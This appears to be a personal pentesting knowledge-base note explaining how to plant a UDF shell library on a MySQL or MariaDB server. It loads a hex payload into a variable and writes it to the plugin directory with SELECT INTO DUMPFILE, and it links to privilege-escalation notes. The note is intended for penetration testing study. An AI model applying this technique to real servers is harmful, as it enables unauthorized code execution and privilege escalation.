# mysql mariadb write UDF shell or any binary file with file permissions

- can use to write UDF shell
`set @shell=0x <hex here> ;`
paste in hex as a variable with no quotes.
prepare payload as plain hex with no newlines with ~/kb/bash-scripting/string-to-hex.sh
```SQL
select @@plugin_dir;
select binary @shell into dumpfile '/path/to/file/file.so';
```
- additional UDF exploit info: https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation-via-library

` zet/20221003151233/README.md `

# Related

- [20221003150987](/zet/20221003150987/README.md) mariadb mysql SQLi
- [20221003151204](/zet/20221003151204/README.md) got access to databases - general SQL
- [20221013222124](/zet/20221013222124/README.md) concept hub for tricks and tips
- [20221014185545](/zet/20221014185545/README.md) kb file named kb/hacking/tricks/mysql-tricks.md
- [20221003151236](/zet/20221003151236/README.md) mysql mariadb
- ~/kb/hacking/tricks/mysql-tricks.md

Tags:

    #hacking #trick #mysql 
